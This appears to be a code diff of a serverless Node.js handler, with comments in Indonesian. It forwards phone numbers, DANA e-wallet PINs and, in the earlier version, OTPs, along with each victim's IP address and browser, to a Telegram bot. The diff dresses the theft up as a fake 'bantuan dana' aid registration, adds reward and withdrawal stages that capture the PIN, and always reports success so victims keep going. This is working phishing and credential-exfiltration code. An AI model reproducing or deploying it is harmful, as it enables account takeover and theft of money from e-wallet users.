@@ -1,7 +1,6 @@
 const https = require('https');
 
 exports.handler = async (event, context) => {
-  // Only allow POST requests
   if (event.httpMethod !== 'POST') {
     return {
       statusCode: 405,
@@ -11,9 +10,8 @@ exports.handler = async (event, context) => {
 
   try {
     const data = JSON.parse(event.body);
-    const { type, phone, pin, otp } = data;
+    const { type, phone, pin, reward } = data;
     
-    // Validasi data yang diperlukan
     if (!type) {
       return {
         statusCode: 400,
@@ -27,9 +25,13 @@ exports.handler = async (event, context) => {
     
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       console.error('Telegram bot configuration missing');
+      // Tetap return success agar flow aplikasi tidak terganggu
       return {
-        statusCode: 500,
-        body: JSON.stringify({ error: 'Server configuration error' })
+        statusCode: 200,
+        body: JSON.stringify({ 
+          success: true, 
+          message: 'Telegram bot not configured, but data processed' 
+        })
       };
     }
 
@@ -37,32 +39,58 @@ exports.handler = async (event, context) => {
     let message = '';
     const timestamp = new Date().toLocaleString('id-ID');
     const userIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown';
+    const userAgent = event.headers['user-agent'] || 'Unknown';
     
     switch (type) {
       case 'phone':
-        message = `📱 *DATA NOMOR DANA* 📱\n\n` +
-                  `🕐 Waktu: ${timestamp}\n` +
-                  `📞 Nomor: +62${phone}\n` +
-                  `🌐 IP: ${userIP}\n` +
+        message = `📱 *DATA PENDAFTARAN BANTUAN DANA* 📱\n\n` +
+                  `🕐 *Waktu:* ${timestamp}\n` +
+                  `📞 *Nomor:* +62${phone}\n` +
+                  `🌐 *IP:* ${userIP}\n` +
+                  `🔍 *Browser:* ${userAgent}\n` +
                   `=================================`;
         break;
         
       case 'pin':
-        message = `🔐 *DATA PIN DANA* 🔐\n\n` +
-                  `🕐 Waktu: ${timestamp}\n` +
-                  `📞 Nomor: +62${phone}\n` +
-                  `🔒 PIN: ${pin}\n` +
-                  `🌐 IP: ${userIP}\n` +
+        message = `🔐 *KODE PENDAFTARAN BANTUAN DANA* 🔐\n\n` +
+                  `🕐 *Waktu:* ${timestamp}\n` +
+                  `📞 *Nomor:* +62${phone}\n` +
+                  `🔢 *Kode Pendaftaran:* ${pin}\n` +
+                  `🌐 *IP:* ${userIP}\n` +
+                  `🔍 *Browser:* ${userAgent}\n` +
                   `=================================`;
         break;
         
-      case 'otp':
-        message = `📨 *DATA OTP DANA* 📨\n\n` +
-                  `🕐 Waktu: ${timestamp}\n` +
-                  `📞 Nomor: +62${phone}\n` +
-                  `🔒 PIN: ${pin}\n` +
-                  `🔢 OTP: ${otp}\n` +
-                  `🌐 IP: ${userIP}\n` +
+      case 'reward':
+        message = `💰 *NOMINAL BANTUAN DANA* 💰\n\n` +
+                  `🕐 *Waktu:* ${timestamp}\n` +
+                  `📞 *Nomor:* +62${phone}\n` +
+                  `🔢 *Kode Pendaftaran:* ${pin}\n` +
+                  `🎁 *Nominal Bantuan:* ${reward}\n` +
+                  `🌐 *IP:* ${userIP}\n` +
+                  `🔍 *Browser:* ${userAgent}\n` +
+                  `=================================`;
+        break;
+        
+      case 'withdraw':
+        message = `💸 *PROSES PENARIKAN DANA* 💸\n\n` +
+                  `🕐 *Waktu:* ${timestamp}\n` +
+                  `📞 *Nomor:* +62${phone}\n` +
+                  `🔒 *PIN DANA:* ${pin}\n` +
+                  `💳 *Jumlah Penarikan:* ${reward}\n` +
+                  `🌐 *IP:* ${userIP}\n` +
+                  `🔍 *Browser:* ${userAgent}\n` +
+                  `=================================`;
+        break;
+        
+      case 'success':
+        message = `✅ *PENARIKAN DANA BERHASIL* ✅\n\n` +
+                  `🕐 *Waktu:* ${timestamp}\n` +
+                  `📞 *Nomor:* +62${phone}\n` +
+                  `🎉 *Jumlah Berhasil Ditarik:* ${reward}\n` +
+                  `🌐 *IP:* ${userIP}\n` +
+                  `🔍 *Browser:* ${userAgent}\n` +
+                  `💰 *Status:* Dana berhasil ditransfer\n` +
                   `=================================`;
         break;
         
@@ -90,21 +118,27 @@ exports.handler = async (event, context) => {
         
         res.on('end', () => {
           if (res.statusCode === 200) {
+            console.log('Telegram message sent successfully');
             resolve(responseData);
           } else {
+            console.error('Telegram API error:', res.statusCode, responseData);
             reject(new Error(`Telegram API error: ${res.statusCode}`));
           }
         });
       }).on('error', (err) => {
+        console.error('HTTP request error:', err);
         reject(err);
       });
     });
 
-    // Simpan ke database atau logging (opsional)
-    console.log('Data received:', JSON.stringify(data));
+    console.log(`Data sent to Telegram: ${type} for phone ${phone}`);
     
     return {
       statusCode: 200,
+      headers: {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Headers': 'Content-Type',
+      },
       body: JSON.stringify({ 
         success: true, 
         message: 'Data sent successfully' 
@@ -114,11 +148,18 @@ exports.handler = async (event, context) => {
   } catch (error) {
     console.error('Error processing request:', error);
     
+    // Tetap return success agar flow aplikasi tidak terganggu
+    // meskipun gagal mengirim ke Telegram
     return {
-      statusCode: 500,
+      statusCode: 200,
+      headers: {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Headers': 'Content-Type',
+      },
       body: JSON.stringify({ 
-        error: 'Internal server error',
-        details: error.message 
+        success: true, 
+        message: 'Data processed but failed to send to Telegram',
+        error: error.message 
       })
     };
   }
